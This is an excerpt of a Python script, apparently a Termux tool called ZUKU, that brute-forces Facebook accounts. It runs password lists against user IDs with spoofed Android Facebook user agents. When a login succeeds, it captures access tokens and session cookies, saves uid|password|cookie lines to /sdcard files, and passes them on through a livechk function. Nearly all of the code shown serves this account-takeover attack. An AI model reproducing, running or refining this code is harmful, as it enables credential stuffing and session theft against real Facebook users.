...
os.system('clear')
os.system('xdg-open https://chat.whatsapp.com/F53bQMq7qnF65ZzbzH80tK')
...
def ua1():
    ...
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH9716;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
    return ua    

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
sys.stdout.write('\x1b]2; ZUKU\x07')
####@-----Folder-----@####
try:os.mkdir('/sdcard/ZUKU')
except:pass
try:
...
def logo():
	os.system('clear')
	logo = (f"""    
d8888888P dP     dP dP     dP dP     dP 
     .d8' 88     88 88   .d8' 88     88 
   .d8'   88     88 88aaa8P'  88     88 
 .d8'     88     88 88   `8b. 88     88 
d8'       Y8.   .8P 88     88 Y8.   .8P 
Y8888888P `Y88888P' dP     dP `Y88888P'                                                                                
\033[1;34m════════════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mFACEBOK \033[1;37m:  THI'W ZUKU
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mGITHUB  \033[1;37m:  ZUKU-404
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mSERVICE \033[1;37m:  FREE \033[1;37m
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mVERSION \033[1;37m:  0.1\033[1;37m   
\033[1;34m════════════════════════════════════════════════""")                              
...
class iAmMain:
	...
	def iAmMenu(self):
		...
		print('\033[1;32m[\033[1;31m1\033[1;32m] \033[1;32mFILE CLONING ')
		print('\033[1;32m[\033[1;31m2\033[1;32m] \033[1;32mGMAIL CLONING ')
		print('\033[1;32m[\033[1;31m0\033[1;32m] \033[1;32mEXIT ')
		line()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[ZUKU-M1] %s | {green}OK:%s {red}CP:%s "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\r\033[1;32m [ZUKU-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')
					p('\033[1;37m[🍪] Cookies :- '+coki)
					ok.append(uid)
					open('/sdcard/ZUKU-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ZUKU-COOKIES.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
					livechk("[•]"+uid+"|"+pw+"|"+coki) 
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ZUKU-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					livechk("[CP]"+uid+"|"+pw)
					break
				else:
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[ZUKU-M2] %s | {green}OK:%s {red}CP:%s "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"         
					p('\r\033[1;92m[ZUKU-OK] %s | %s \033[1;97m '%(uid,pw))
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r\033[1;97m[ZUKU-M3] %s | {green}OK:%s {red}CP:%s "%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
def rndm(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\033[1;97m[ZUKU-R] %s | {green}OK:%s {red}CP:%s "%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:    
            ...
            if 'access_token' in q:
                ...
                print('\r\r\033[1;32m [ZUKU-OK] '+uid+' | '+pas+'\033[1;97m')
                print('\033[1;33m [🍪] Cookies :- '+coki)
                open('/sdcard/RANDOM-ok.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                livechk("[•]"+uid+"|"+pas+"|"+cookie) 
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{A}[ZUKU-CP] {uid} | {pas} ")
